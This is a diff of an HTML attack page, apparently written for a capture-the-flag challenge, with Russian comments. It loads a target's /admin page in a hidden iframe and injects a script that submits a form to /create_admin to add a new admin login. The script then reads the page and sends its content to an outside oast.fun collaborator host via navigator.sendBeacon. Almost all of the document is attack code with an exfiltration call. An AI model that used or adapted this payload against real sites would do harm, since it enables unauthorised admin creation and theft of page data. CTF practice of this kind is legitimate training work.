@@ -1,44 +1,52 @@
 <!DOCTYPE html>
 <html>
 <body>
+<iframe id="targetFrame" style="display:none"></iframe>
+
 <script>
 const TARGET = 'https://tasks.goidactf.ru:20431';
 const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 
-// Открываем новое окно с целевым сайтом
-const win = window.open(TARGET + '/admin', '_blank');
+// 1. Загружаем iframe с целевым сайтом
+const iframe = document.getElementById('targetFrame');
+iframe.src = TARGET + '/admin';
 
-setTimeout(() => {
+iframe.onload = function() {
+    // 2. Когда iframe загрузился, выполняем в нём скрипт
     try {
-        // В новом окне выполняем скрипт
         const script = `
+            // Этот код выполнится в контексте целевого сайта!
             const form = document.createElement('form');
             form.method = 'POST';
             form.action = '/create_admin';
-            form.innerHTML = '<input name="new_admin_login" value="FROM_WINDOW_OPEN">';
+            form.innerHTML = '<input name="new_admin_login" value="FROM_SAME_ORIGIN">';
             document.body.appendChild(form);
             form.submit();
             
+            // Ждём результат
             setTimeout(() => {
-                // Отправляем результат через postMessage
-                window.opener.postMessage({
+                // Теперь читаем ответ (same-origin, CORS не блокирует!)
+                const result = document.body.innerHTML;
+                
+                // Отправляем через postMessage родителю
+                parent.postMessage({
                     type: 'result',
-                    data: document.body.innerHTML.substring(0, 2000)
+                    data: result.substring(0, 2000)
                 }, '*');
             }, 2000);
         `;
         
-        win.eval(script);
+        iframe.contentWindow.eval(script);
     } catch(e) {
-        navigator.sendBeacon(COLLAB + '/error', 'window_open_error: ' + e.message);
+        navigator.sendBeacon(COLLAB + '/error', 'iframe_eval_error: ' + e.message);
     }
-}, 2000);
+};
 
-// Получаем результат
+// 3. Получаем результат
 window.addEventListener('message', function(event) {
     if (event.data && event.data.type === 'result') {
         navigator.sendBeacon(
-            COLLAB + '/window_result',
+            COLLAB + '/capture',
             event.data.data
         );
     }
